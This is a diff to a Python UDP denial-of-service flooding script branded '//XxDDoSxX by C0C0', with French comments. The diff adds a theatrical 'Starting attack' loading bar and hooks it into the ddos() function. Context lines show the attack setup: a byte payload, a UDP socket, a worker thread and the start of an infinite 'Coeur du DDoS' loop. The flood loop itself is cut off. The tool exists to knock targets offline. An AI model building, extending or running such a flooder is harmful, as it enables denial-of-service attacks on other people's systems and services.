@@ -1,4 +1,4 @@
-import socket, os , datetime, sys, threading, select
+import socket, os , datetime, sys, threading, select, time as t
 
 # Setup de print couleur
 def printRed(text):
@@ -31,6 +31,56 @@ def style():
 	printCyan("===========================================================================")
 	printLightPurple("                           //XxDDoSxX by C0C0\\\\") 
 	printCyan("===========================================================================")
+
+# Fonction pour le chargement
+def loading():
+	style()
+	printRed("                              Starting attack")
+	printLightPurple("                           ____________________")
+	printLightPurple("                          |          0%        |")
+	printLightPurple("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
+	t.sleep(1)
+	style()
+	printRed("                              Starting attack.")
+	printLightPurple("                           ____________________")
+	printLightPurple("                          |==       10%        |")
+	printLightPurple("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
+	t.sleep(1.2)
+	style()
+	printRed("                              Starting attack..")
+	printLightPurple("                           ____________________")
+	printLightPurple("                          |=====    25%        |")
+	printLightPurple("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
+	t.sleep(1.1)
+	style()
+	printRed("                              Starting attack...")
+	printLightPurple("                           ____________________")
+	printLightPurple("                          |======== 40%        |")
+	printLightPurple("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
+	style()
+	printRed("                              Starting attack")
+	printLightPurple("                           ____________________")
+	printLightPurple("                          |=========55%        |")
+	printLightPurple("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
+	t.sleep(1)
+	style()
+	printRed("                              Starting attack.")
+	printLightPurple("                           ____________________")
+	printLightPurple("                          |=========70%=       |")
+	printLightPurple("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
+	t.sleep(1.3)
+	style()
+	printRed("                              Starting attack..")
+	printLightPurple("                           ____________________")
+	printLightPurple("                          |=========85%====    |")
+	printLightPurple("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
+	t.sleep(1.4)
+	style()
+	printRed("                              Starting attack...")
+	printLightPurple("                           ____________________")
+	printLightPurple("                          |=========100%=======|")
+	printLightPurple("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
+	t.sleep(1.2)
 
 
 # Setup de now (Heure actuelle en secondes)
@@ -132,6 +182,9 @@ def ddos():
 	# Message avec nombre de bytes
 	send = "0"*bytes
 
+	# Chargement
+	loading()
+
 	# Création d'un paquet UDP
 	sock = socket.socket(socket.AF_INET, 	socket.SOCK_DGRAM)
 
@@ -148,6 +201,8 @@ def ddos():
 	
 	# Début du thread
 	thread.start()
+
+
 	
 	# Coeur du DDoS
 	while True:	
